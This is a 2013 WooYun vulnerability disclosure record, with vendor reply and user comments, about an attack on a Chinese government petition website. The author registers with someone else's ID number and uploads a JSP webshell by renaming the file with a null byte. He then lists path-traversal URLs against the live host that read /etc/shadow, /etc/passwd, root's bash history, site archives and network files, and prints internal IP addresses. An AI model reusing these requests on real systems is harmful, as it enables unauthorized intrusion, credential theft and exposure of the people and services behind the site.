{"id": 10508, "wybug_id": "wooyun-2013-027899", "wybug_title": "国家信访局某业务漏洞测试打包（严重的可控制服务器）", "wybug_corp": "国家信访局", "wybug_author": "路人甲", "wybug_date": "2013-07-06 09:03", "wybug_open_date": "2013-08-20 09:03", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["后台", "遍历"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-20：\t细节向公众公开  简要描述： 文件遍历，然后你懂得！ 详细说明：  最近看网易新闻:国家信访局允许中国公民以实名方式投诉信访了。而且据说这个网站花费好几\"百\"万,黄金打造的网站嘛?带着好奇，顺手GOOGLE到国家信访局网站：http://www.gjxfj.gov.cn投诉开放了，曾经一度造成网站崩溃,到底是怎样一个热闹情况，有公布官员财产吗？带着好奇打开投诉主页,提示注册才可登陆：http://ts.gjxfj.gov.cn/login-do.pfv然后由程序一致性，联想到后台很可能就是:http://ts.gjxfj.gov.cn/admin/login-do.pfv果然跳转到后台http://ts.gjxfj.gov.cn/admin/tsbsys.jspGOOGLE到一个身份证信息,成功注册。发表投诉,测试下:http://ts.gjxfj.gov.cn/common/html/upfile_table.htm   这个地方可以上传文件啊。POST /HttpFileServlet?method=webUpload&sessionId=1234&suffix=zip&tempFile=&fileValue=C:\\Documents%20and%20Settings\\Administrator\\Desktop\\test.jsp%00.zip/common/html/upfile_new.jsp?ecdc3d8c-e496-11e2-9fef-2f7f29c9a4eb.jspBurp抓包修改文件名，上传成功并且webshell名字为: ecdc3d8c-e496-11e2-9fef-2f7f29c9a4eb.jsp，苦于不知道路径啊！当然要去google下有没有别人上传的文件路径的链接。Site:ts.gjxfj.gov.cn inurl:.doc|docx|zip|rar|excel\n\n找到了23个doc文档。链接统一如下： http://ts.gjxfj.gov.cn/downloadFile.pfv?domain=xffj&path=dfyjs&fileName=1daa0067-5ba4-11e1-8e4c-7bfd30aedc22.doc一向对国人写的代码不放心的我，毫不犹豫的测试文件遍历下载漏洞。http://ts.gjxfj.gov.cn/downloadFile.pfv?domain=xffj&path=dfyjs&fileName=../../../../etc/passwd嘎嘎！还真有啊!\n\n他们都说jsp的权限很大，那我试试看。http://ts.gjxfj.gov.cn/downloadFile.pfv?domain=xffj&path=dfyjs&fileName=../../../../etc/shadow\n\n我勒个去！还真大啊！Root密码都弄到了！看看管理员平时都敲些什么命令：http://ts.gjxfj.gov.cn/downloadFile.pfv?domain=xffj&path=dfyjs&fileName=../../../../root/.bash_history\n\n啊！ 其中不乏网站打包解压之类的。好吧，我把网站包来下它一下。http://ts.gjxfj.gov.cn/downloadFile.pfv?domain=xffj&path=dfyjs&fileName=../../../../opt/weblogic/user_projects/domains/jscxwebdomain/WebRoot20130628.tar\n\n150M，我只是看了看，没有下载哦，不负法律责任哦。http://ts.gjxfj.gov.cn/downloadFile.pfv?domain=xffj&path=dfyjs&fileName=../../../../opt/weblogic/user_projects/domains/jscxcoredomain//platform20130628.tar机器：http://ts.gjxfj.gov.cn/downloadFile.pfv?domain=xffj&path=dfyjs&fileName=../../../../etc/hosts10.22.2.2\tww_web192.168.1.1\thb110.22.2.130\tww-web1.localdomain\tww-web110.22.2.131\tww_web2192.168.1.2\thb2127.0.0.1\tlocalhost.localdomain\tlocalhost系统版本： http://ts.gjxfj.gov.cn/downloadFile.pfv?domain=xffj&path=dfyjs&fileName=../../../../etc/issueAsianux release 2.0 (Trinity SP2)Kernel \\r on an \\m网卡：http://ts.gjxfj.gov.cn/downloadFile.pfv?domain=xffj&path=dfyjs&fileName=../../../../etc/sysconfig/network-scripts/ifcfg-eth0DEVICE=\"eth0\"BOOTPROTO=\"none\"ONBOOT=\"yes\"IPADDR=\"10.22.2.130\"NETMASK=\"255.255.255.0\"下班回家了！不由长叹一声:哎！   漏洞证明：  如上！   修复方案：  文件下载代码做防文件遍历呗   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2013-07-10 21:46 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-31 09:35 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  写了好多！洞主厉害    \n     2013-08-20 13:20 |    \t\tIXY \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:3        | 小菜来学习的)\t\t \n  这在58必须8K啊    \n     2013-08-20 13:24 |    \t\titleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:17        )\t\t \n  这个案例提供了任意下载漏洞进一步利用思路真不错..    \n     2013-08-20 14:35 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  神奇的路人甲。    \n     2013-08-20 16:01 |    \t\t乌帽子 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 学习黑客哪家强 | 中国山东找蓝翔 | sql...)\t\t \n  lz够黑啊。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}